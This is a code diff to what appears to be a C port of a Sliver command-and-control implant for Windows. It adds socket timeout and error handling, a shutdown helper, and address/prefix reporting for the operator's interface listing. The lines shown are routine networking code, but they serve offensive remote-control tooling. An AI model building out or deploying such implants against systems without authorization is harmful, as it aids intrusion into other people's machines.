@@ -70,6 +70,13 @@ long sliver_socket_send(sliver_socket_t *s, const void *buf, size_t len) {
     return -1;
   }
   n = send(s->fd, (const char *)buf, (int)len, 0);
+  if (n == SOCKET_ERROR) {
+    int err = WSAGetLastError();
+    if (err == WSAETIMEDOUT || err == WSAEWOULDBLOCK) {
+      return -2; /* send buffer full / send timeout: retry later */
+    }
+    return -1;
+  }
   return (long)n;
 }
 
@@ -79,7 +86,22 @@ long sliver_socket_recv(sliver_socket_t *s, void *buf, size_t len) {
     return -1;
   }
   n = recv(s->fd, (char *)buf, (int)len, 0);
+  if (n == SOCKET_ERROR) {
+    int err = WSAGetLastError();
+    if (err == WSAETIMEDOUT || err == WSAEWOULDBLOCK) {
+      return -2; /* receive timeout: nothing available yet */
+    }
+    /* WSAECONNRESET / WSAENETDOWN / ...: the peer is gone for good. */
+    return -1;
+  }
   return (long)n;
+}
+
+void sliver_socket_shutdown(sliver_socket_t *s) {
+  if (s == NULL) {
+    return;
+  }
+  (void)shutdown(s->fd, SD_BOTH);
 }
 
 void sliver_socket_close(sliver_socket_t *s) {
@@ -122,6 +144,15 @@ void sliver_socket_set_recv_timeout(sliver_socket_t *s, int ms) {
   }
   tv = (DWORD)ms;
   (void)setsockopt(s->fd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv));
+}
+
+void sliver_socket_set_send_timeout(sliver_socket_t *s, int ms) {
+  DWORD tv;
+  if (s == NULL) {
+    return;
+  }
+  tv = (DWORD)ms;
+  (void)setsockopt(s->fd, SOL_SOCKET, SO_SNDTIMEO, (const char *)&tv, sizeof(tv));
 }
 
 
@@ -171,7 +202,11 @@ int sliver_net_list(sliver_iface_t *out, int max) {
       char host[64];
       if (getnameinfo(ua->Address.lpSockaddr, ua->Address.iSockaddrLength, host, sizeof(host),
                       NULL, 0, NI_NUMERICHOST) == 0) {
-        (void)snprintf(it->ips[it->ip_count], sizeof(it->ips[0]), "%s", host);
+        /* Sliver's client shows "addr/prefix" and uses the prefix to tell local
+         * addresses apart (client/command/network/ifconfig.go); the Go implant
+         * sends net.IPNet.String(). */
+        (void)snprintf(it->ips[it->ip_count], sizeof(it->ips[0]), "%s/%u", host,
+                       (unsigned)ua->OnLinkPrefixLength);
         it->ip_count++;
       }
     }
